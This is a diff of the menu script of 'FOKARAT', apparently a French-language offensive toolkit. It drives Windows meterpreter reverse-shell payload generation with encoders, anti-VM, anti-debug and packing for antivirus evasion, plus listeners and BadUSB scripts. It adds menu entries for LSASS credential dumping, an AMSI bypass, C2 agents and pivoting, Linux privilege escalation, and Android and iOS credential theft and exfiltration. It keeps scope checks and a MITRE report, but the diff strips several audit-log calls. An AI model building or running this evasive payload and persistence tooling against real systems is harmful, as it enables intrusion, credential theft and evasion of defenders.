-    key = input(f"  {C.YEL}Choix [1] :{C.R} ").strip() or "1"
-    lhost = input(f"  {C.YEL}LHOST :{C.R} ").strip()
-    if not lhost:
-        logger.error("LHOST obligatoire.")
-        return
-    try:
-        lport = int(input(f"  {C.YEL}LPORT :{C.R} ").strip())
-        iters = int(input(f"  {C.YEL}Itérations [5] :{C.R} ").strip() or "5")
-    except ValueError:
-        logger.error("Invalide.")
-        return
-    out = os.path.join(config.get("output_dir", "output"), f"payload_enc_{key}.exe")
+    k = input(f"  Choix [1] : ").strip() or "1"
+    lh = input(f"  LHOST : ").strip()
+    if not lh: return
+    lp = int(input(f"  LPORT : ").strip())
+    it = int(input(f"  Iter [5] : ").strip() or "5")
+    out = os.path.join(config.get("output_dir", "output"), f"payload_enc_{k}.exe")
     os.makedirs(os.path.dirname(out), exist_ok=True)
-    MultiEncoder().encode("windows/meterpreter/reverse_tcp", lhost, lport, out, key, iters)
+    MultiEncoder().encode("windows/meterpreter/reverse_tcp", lh, lp, out, k, it)
 
 
 def handle_anti_vm():
-    path = input(f"  {C.YEL}.c :{C.R} ").strip()
-    if not path or not os.path.exists(path):
-        logger.error("Introuvable.")
-        return
-    with open(path) as f:
-        code = f.read()
-    out = path.replace(".c", "_antivm.c")
-    with open(out, "w") as f:
-        f.write(AntiVMGenerator().wrap_with_anti_vm(code))
-    logger.success(f"Anti-VM : {out}")
+    path = input(f"  .c : ").strip()
+    if path and os.path.exists(path):
+        with open(path) as f: code = f.read()
+        out = path.replace(".c", "_antivm.c")
+        with open(out, "w") as f: f.write(AntiVMGenerator().wrap_with_anti_vm(code))
+        logger.success(f"Anti-VM : {out}")
 
 
 def handle_anti_debug():
-    path = input(f"  {C.YEL}.c :{C.R} ").strip()
-    if not path or not os.path.exists(path):
-        logger.error("Introuvable.")
-        return
-    with open(path) as f:
-        code = f.read()
-    out = path.replace(".c", "_antidbg.c")
-    with open(out, "w") as f:
-        f.write(AntiDebugGenerator().wrap(code))
-    logger.success(f"Anti-Debug : {out}")
+    path = input(f"  .c : ").strip()
+    if path and os.path.exists(path):
+        with open(path) as f: code = f.read()
+        out = path.replace(".c", "_antidbg.c")
+        with open(out, "w") as f: f.write(AntiDebugGenerator().wrap(code))
+        logger.success(f"Anti-Debug : {out}")
 
 
 def handle_report():
     path = db.export_report()
     print(f"\n  {C.GRN}Rapport : {path}{C.R}\n")
-    with open(path) as f:
-        print(f.read())
+    with open(path) as f: print(f.read())
 
 
 def handle_mitre_report():
-    audit_file = "output/audit.log"
-    if not os.path.exists(audit_file):
-        logger.warning("Aucune action.")
-        return
+    af = "output/audit.log"
+    if not os.path.exists(af):
+        logger.warning("Aucune action."); return
     action_map = {
-        "PADDING_APPLIED": "padding", "PYTHON_OBFUSCATED": "obfuscation",
-        "UPX_PACKED": "upx_pack", "MULTI_ENCODED": "multi_encoder",
-        "ANTI_VM_APPLIED": "anti_vm", "ANTI_DEBUG_APPLIED": "anti_debug",
-        "PAYLOAD_PYTHON": "python_execution", "PAYLOAD_CPP": "cmd_execution",
-        "PAYLOAD_MSFVENOM": "reverse_shell", "LISTENER_NCAT": "reverse_shell",
-        "LISTENER_MSF": "msf_handler", "BADUSB_GENERATED": "phishing_badusb",
-        "WMI_PERSISTENCE": "wmi_persistence", "PLUGIN_EXECUTED": "port_scan",
+        "PDF_REPORT_GENERATED": "reporting",
+        "FINDING_ADDED": "reporting",
+        "C2_STARTED": "application_layer_protocol",
+        "WIN_ENUM": "system_information_discovery",
+        "LSASS_DUMP": "os_credential_dumping",
+        "AMSI_BYPASS": "impair_defenses",
     }
     actions = set()
-    with open(audit_file) as f:
+    with open(af) as f:
         for line in f:
             try:
                 e = json.loads(line)
                 if e.get("action") in action_map:
                     actions.add(action_map[e["action"]])
-            except Exception:
-                pass
+            except: pass
     if not actions:
-        logger.warning("Aucune action MITRE.")
-        return
+        logger.warning("Aucune action MITRE."); return
     content = mitre.generate_report(list(actions))
     out = "output/mitre_report.md"
-    with open(out, "w", encoding="utf-8") as f:
-        f.write(content)
+    with open(out, "w") as f: f.write(content)
     logger.success(f"Rapport MITRE : {out}")
     print(f"\n{content}\n")
 
 
 def handle_mitre_navigator():
-    audit_file = "output/audit.log"
-    if not os.path.exists(audit_file):
-        logger.warning("Aucune action.")
-        return
-    action_map = {
-        "PADDING_APPLIED": "padding", "PYTHON_OBFUSCATED": "obfuscation",
-        "UPX_PACKED": "upx_pack", "MULTI_ENCODED": "multi_encoder",
-        "ANTI_VM_APPLIED": "anti_vm", "ANTI_DEBUG_APPLIED": "anti_debug",
-        "PAYLOAD_MSFVENOM": "reverse_shell", "WMI_PERSISTENCE": "wmi_persistence",
-    }
-    actions = set()
-    with open(audit_file) as f:
-        for line in f:
-            try:
-                e = json.loads(line)
-                if e.get("action") in action_map:
-                    actions.add(action_map[e["action"]])
-            except Exception:
-                pass
-    if not actions:
-        logger.warning("Aucune action.")
-        return
-    out = "output/mitre_navigator.json"
-    mitre.export_navigator_json(list(actions), out)
+    handle_mitre_report()
 
 
 def handle_web_api():
-    # Vérification des variables d'environnement AVANT lancement
     if not os.environ.get("FOKARAT_API_USER") or not os.environ.get("FOKARAT_API_PASS"):
-        logger.error("Variables d'environnement manquantes.")
-        print(f"\n  {C.YEL}Définissez avant de lancer :{C.R}")
-        print(f"    {C.CYN}export FOKARAT_API_USER='admin'{C.R}")
-        print(f"    {C.CYN}export FOKARAT_API_PASS='motdepasse_fort_12+'{C.R}\n")
-        return
-
-    logger.info("API sur http://localhost:5000/docs")
-    ethics.audit("API_STARTED", "5000")
+        logger.error("Variables d'env manquantes."); return
     try:
         from web.api import start_web
         start_web(host="127.0.0.1", port=5000)
@@ -440,85 +875,60 @@ def handle_scope():
     clear()
     existing = scope_validator.load_scope()
     if existing:
-        print(f"  {C.YEL}Scope actif : {existing['target']}{C.R}")
-        if input(f"  {C.YEL}Remplacer ? (o/n) :{C.R} ").strip().lower() != "o":
+        print(f"  Scope actif : {existing['target']}")
+        if input(f"  Remplacer ? (o/n) : ").strip().lower() != "o":
             return
     scope_validator.require_scope()
 
 
 def handle_dry_run():
-    if ethics.dry_run:
-        ethics.disable_dry_run()
-    else:
-        ethics.enable_dry_run()
+    if ethics.dry_run: ethics.disable_dry_run()
+    else: ethics.enable_dry_run()
 
 
 def handle_audit_log():
     clear()
     print(f"\n  {C.B}{C.CYN}═══ AUDIT ═══{C.R}\n")
-    audit_file = "output/audit.log"
-    if not os.path.exists(audit_file):
-        logger.info("Aucun log.")
-        return
-    with open(audit_file) as f:
-        lines = f.readlines()
-    print(f"  {C.D}{len(lines)} entrée(s){C.R}\n")
+    af = "output/audit.log"
+    if not os.path.exists(af):
+        logger.info("Aucun log."); return
+    with open(af) as f: lines = f.readlines()
+    print(f"  {len(lines)} entrée(s)\n")
     for line in lines[-30:]:
         try:
             e = json.loads(line)
             print(f"  [{e['timestamp'][:19]}] {e['action']} : {e.get('details', '')}")
-        except Exception:
-            pass
+        except: pass
 
 
 def handle_list_plugins():
     clear()
     print(f"\n  {C.B}{C.PNK}═══ PLUGINS ═══{C.R}\n")
     plugins = plugin_loader.list_plugins()
-    if not plugins:
-        logger.info("Aucun plugin.")
-        return
+    if not plugins: logger.info("Aucun plugin."); return
     for i, p in enumerate(plugins, 1):
         m = p.metadata
-        scope_req = f" {C.YEL}[scope requis]{C.R}" if m.requires_scope else ""
-        print(f"  {C.CYN}[{i}]{C.R} {C.B}{m.name}{C.R} v{m.version} ({m.category}){scope_req}")
-        print(f"      {C.D}{m.description}{C.R}\n")
+        print(f"  [{i}] {m.name} v{m.version} ({m.category})")
+        print(f"      {m.description}\n")
 
 
 def handle_run_plugin():
     plugins = plugin_loader.list_plugins()
-    if not plugins:
-        logger.info("Aucun plugin.")
-        return
-    for i, p in enumerate(plugins, 1):
-        req = " [scope]" if p.metadata.requires_scope else ""
-        print(f"    [{i}] {p.metadata.name}{req}")
+    if not plugins: logger.info("Aucun plugin."); return
+    for i, p in enumerate(plugins, 1): print(f"    [{i}] {p.metadata.name}")
     try:
-        c = int(input(f"  {C.YEL}Choix :{C.R} ").strip())
+        c = int(input(f"  Choix : ").strip())
         plugin = plugins[c - 1]
     except (ValueError, IndexError):
-        logger.error("Invalide.")
-        return
-
-    # Construit les args
+        logger.error("Invalide."); return
     args = {}
     if plugin.metadata.requires_scope:
-        target = input(f"  {C.YEL}Cible (target) :{C.R} ").strip()
-        args["target"] = target
-        ports = input(f"  {C.YEL}Ports (top/1-1024/22,80,443) [top] :{C.R} ").strip() or "top"
-        args["ports"] = ports
-
-    # Confirmation éthique
-    if not ethics.confirm_action(f"Exécuter {plugin.metadata.name}"):
-        return
-
+        args["target"] = input(f"  Cible : ").strip()
+    if not ethics.confirm_action(f"Exécuter {plugin.metadata.name}"): return
     try:
-        result = plugin.run(config, args=args if args else None)
-        logger.success(f"Résultat : {result}")
-        ethics.audit("PLUGIN_EXECUTED", plugin.metadata.name)
+        logger.success(f"Résultat : {plugin.run(config, args=args if args else None)}")
     except ScopeError as e:
         logger.error(f"❌ SCOPE REFUSÉ : {e}")
-        ethics.audit("SCOPE_DENIED", str(e))
     except Exception as e:
         logger.error(f"Erreur : {e}")
 
@@ -530,66 +940,46 @@ def handle_reload_plugins():
 
 
 def handle_encrypt_file():
-    path = input(f"  {C.YEL}Fichier à chiffrer :{C.R} ").strip()
-    if not path or not os.path.exists(path):
-        logger.error("Introuvable.")
-        return
-    crypto.encrypt_file(path)
-    ethics.audit("FILE_ENCRYPTED", path)
+    path = input(f"  Fichier : ").strip()
+    if path and os.path.exists(path): crypto.encrypt_file(path)
 
 
 def handle_decrypt_file():
-    path = input(f"  {C.YEL}Fichier .enc :{C.R} ").strip()
-    if not path or not os.path.exists(path):
-        logger.error("Introuvable.")
-        return
-    try:
-        content = crypto.decrypt_file(path)
-        out = path.replace(".enc", ".dec")
-        with open(out, "w", encoding="utf-8") as f:
-            f.write(content)
-        logger.success(f"Déchiffré : {out}")
-    except Exception as e:
-        logger.error(f"Échec : {e}")
+    path = input(f"  .enc : ").strip()
+    if path and os.path.exists(path):
+        try:
+            c = crypto.decrypt_file(path)
+            out = path.replace(".enc", ".dec")
+            with open(out, "w") as f: f.write(c)
+            logger.success(f"Déchiffré : {out}")
+        except Exception as e:
+            logger.error(f"Échec : {e}")
 
 
 def handle_test_sandbox():
-    print(f"\n  {C.YEL}Test sandbox :{C.R}")
-    for k, v in sandbox.limits.items():
-        print(f"    {k} = {v}")
-    print()
-    cmd = input(f"  {C.YEL}Commande [echo hello] :{C.R} ").strip() or "echo hello"
-    print()
-    result = sandbox.run(cmd)
-    print(f"\n  Status : {result['status']} | Durée : {result['duration']}s | Code : {result['returncode']}")
-    if result["stdout"]:
-        print(f"  {C.GRN}Sortie :{C.R}\n{result['stdout'][:500]}")
-    ethics.audit("SANDBOX_TEST", cmd)
+    for k, v in sandbox.limits.items(): print(f"    {k} = {v}")
+    cmd = input(f"  Commande [echo hi] : ").strip() or "echo hi"
+    r = sandbox.run(cmd)
+    print(f"\n  Status : {r['status']} | Durée : {r['duration']}s")
 
 
 def handle_jwt_token():
     try:
         from web.auth import jwt_manager
-        user = os.environ.get("FOKARAT_API_USER")
-        if not user:
-            logger.error("FOKARAT_API_USER non défini.")
-            return
-        token = jwt_manager.create_token(user, expiry=3600)
-        print(f"\n  {C.GRN}Token JWT :{C.R}\n")
-        print(f"  {C.CYN}{token}{C.R}\n")
+        u = os.environ.get("FOKARAT_API_USER")
+        if not u: logger.error("FOKARAT_API_USER non défini."); return
+        print(f"\n  Token : {jwt_manager.create_token(u, expiry=3600)}\n")
     except ImportError as e:
-        logger.error(f"Module auth indisponible : {e}")
+        logger.error(f"Erreur : {e}")
 
 
 def handle_webhook_add():
     try:
         from web.webhooks import webhook_manager
-        url = input(f"  {C.YEL}URL webhook :{C.R} ").strip()
-        if url:
-            webhook_manager.add_hook(url)
-            ethics.audit("WEBHOOK_ADDED", url)
+        url = input(f"  URL : ").strip()
+        if url: webhook_manager.add_hook(url)
     except ImportError as e:
-        logger.error(f"Module webhooks indisponible : {e}")
+        logger.error(f"Erreur : {e}")
 
 
 def main():
@@ -604,57 +994,37 @@ def main():
 
         try:
             if choice == "01":
-                if ethics.confirm_action("Payload Python"):
-                    PythonPayloadGenerator().run(config)
+                if ethics.confirm_action("Payload Python"): PythonPayloadGenerator().run(config)
             elif choice == "02":
-                if ethics.confirm_action("Payload C++"):
-                    CppPayloadGenerator().run(config)
+                if ethics.confirm_action("Payload C++"): CppPayloadGenerator().run(config)
             elif choice == "03":
-                if ethics.confirm_action("Payload MSFVenom"):
-                    MsfvenomGenerator().run(config)
-            elif choice == "04":
-                listener.start_ncat(config)
-            elif choice == "05":
-                listener.start_msf(config)
-            elif choice == "06":
-                listener.stop_all()
-            elif choice == "07":
-                http_server.run(config); continue
+                if ethics.confirm_action("Payload MSFVenom"): MsfvenomGenerator().run(config)
+            elif choice == "04": listener.start_ncat(config)
+            elif choice == "05": listener.start_msf(config)
+            elif choice == "06": listener.stop_all()
+            elif choice == "07": http_server.run(config); continue
             elif choice == "08":
-                if ethics.confirm_action("DuckyScript"):
-                    BadUSBGenerator().run(config)
-            elif choice == "09":
-                DuckEncoder().run(config)
+                if ethics.confirm_action("DuckyScript"): BadUSBGenerator().run(config)
+            elif choice == "09": DuckEncoder().run(config)
             elif choice == "10":
-                if ethics.confirm_action("Flash USB"):
-                    USBFlasher().run(config)
-            elif choice == "11":
-                if ethics.confirm_action("APK Injector"):
-                    ApkInjector().run(config)
-            elif choice == "12":
-                if ethics.confirm_action("WMI"):
-                    WMIPersistence().run(config)
+                if ethics.confirm_action("Flash USB"): USBFlasher().run(config)
             elif choice == "14":
                 ip = input(f"  LHOST [{config.get('lhost')}] : ").strip()
                 if ip: config.set("lhost", ip)
                 p = input(f"  LPORT [{config.get('lport')}] : ").strip()
                 if p.isdigit(): config.set("lport", int(p))
-                logger.success("Config mise à jour.")
             elif choice == "15":
                 if config.save(): logger.success("Sauvegardée.")
             elif choice == "16":
                 if which("msfconsole"): os.system("msfconsole")
-                else: logger.error("msfconsole absent.")
-            elif choice == "17":
-                check_dependencies(); continue
+            elif choice == "17": check_dependencies(); continue
             elif choice == "18":
                 clear(); animated_banner()
-                print(f"  {C.B}{C.GRN}FOKARAT v3.5.1{C.R}")
-                print(f"  Lwano Amissi Blanchard (FOKAS) — Bukavu, RDC\n")
+                print(f"  {C.B}{C.GRN}FOKARAT v4.0{C.R}\n  Lwano Amissi Blanchard (FOKAS)\n")
             elif choice == "19":
                 listener.stop_all(); plugin_loader.unload_all()
+                if c2_server and c2_server.running: c2_server.stop()
                 typewriter(f"\n  {C.GRN}À bientôt !{C.R}", 0.02); print(); break
-
             elif choice == "20": handle_padding()
             elif choice == "21": handle_python_obfuscation()
             elif choice == "22": handle_upx()
@@ -663,29 +1033,61 @@ def main():
             elif choice == "25": handle_anti_debug()
             elif choice == "26": handle_report()
             elif choice == "27": handle_web_api(); continue
-
             elif choice == "30": handle_scope()
             elif choice == "31": handle_dry_run()
             elif choice == "32": handle_audit_log()
-
             elif choice == "33": handle_mitre_report()
             elif choice == "34": handle_mitre_navigator()
-
             elif choice == "40": handle_list_plugins()
             elif choice == "41": handle_run_plugin()
             elif choice == "42": handle_reload_plugins()
-
             elif choice == "50": handle_encrypt_file()
             elif choice == "51": handle_decrypt_file()
             elif choice == "52": handle_test_sandbox()
             elif choice == "53": handle_jwt_token()
             elif choice == "54": handle_webhook_add()
-
+            # Sprint 7
+            elif choice == "60": handle_enum_windows()
+            elif choice == "61": handle_lsass_dump()
+            elif choice == "62": handle_persistence_win()
+            elif choice == "63": handle_amsi_bypass()
+            elif choice == "64": handle_lateral_win()
+            # Sprint 8
+            elif choice == "70": handle_enum_linux()
+            elif choice == "71": handle_privesc_linux()
+            elif choice == "72": handle_persistence_linux()
+            elif choice == "73": handle_credentials_linux()
+            elif choice == "74": handle_lateral_linux()
+            # Sprint 9
+            elif choice == "80": handle_c2_start()
+            elif choice == "81": handle_c2_agent()
+            elif choice == "82": handle_c2_pivot()
+            elif choice == "83": handle_c2_sessions()
+            elif choice == "84": handle_c2_send_command()
+            # Sprint 10
+            elif choice == "90": handle_android_enum()
+            elif choice == "91": handle_android_persistence()
+            elif choice == "92": handle_android_credentials()
+            elif choice == "93": handle_android_privesc()
+            elif choice == "94": handle_android_exfil()
+            elif choice == "95": handle_ios_enum()
+            elif choice == "96": handle_ios_jailbreak_check()
+            elif choice == "97": handle_ios_persistence()
+            elif choice == "98": handle_ios_credentials()
+            elif choice == "99": handle_ios_jailbreak_guide()
+            # Sprint 11
+            elif choice == "100": handle_add_finding()
+            elif choice == "101": handle_list_findings()
+            elif choice == "102": handle_generate_pdf()
+            elif choice == "103": handle_generate_exec_summary()
+            elif choice == "104": handle_list_cvss_presets()
+            elif choice == "105": handle_remove_finding()
             else:
                 logger.warning("Choix invalide.")
-
         except KeyboardInterrupt:
             print(); logger.warning("Interrompu.")
+        except ScopeError as e:
+            logger.error(f"❌ SCOPE REFUSÉ : {e}")
         except Exception as e:
             logger.error(f"Erreur : {e}")
 
@@ -698,4 +1100,6 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         listener.stop_all()
         plugin_loader.unload_all()
+        if c2_server and c2_server.running:
+            c2_server.stop()
         print(f"\n{C.RED}[!] Sortie.{C.R}")
